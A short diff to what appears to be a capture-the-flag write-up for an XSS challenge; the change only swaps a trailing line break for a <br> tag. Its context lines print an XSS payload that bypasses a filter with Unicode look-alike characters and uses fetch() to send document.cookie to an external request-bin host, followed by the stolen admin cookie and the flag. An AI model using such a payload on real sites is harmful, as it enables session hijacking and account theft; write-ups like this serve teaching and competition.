@@ -22,5 +22,5 @@ Not only does this occur for the angle brackets but also simply the string "scri
 ```
 "＞＜scᴿipt＞ fetch(`https://[my_bin].x.pipedream.net/c=${document.cookie}`)＜/scᴿipt＞
 ```
-Then, after retrieving the cookie **sup3rs3cur34dm1nc00k13**, we can set it on our browser and visit the `/admin` page to read the flag.  
+Then, after retrieving the cookie **sup3rs3cur34dm1nc00k13**, we can set it on our browser and visit the `/admin` page to read the flag.<br>
 Flag: **DUCTF{\_un1c0de\_bypass_x55_ftw!}**
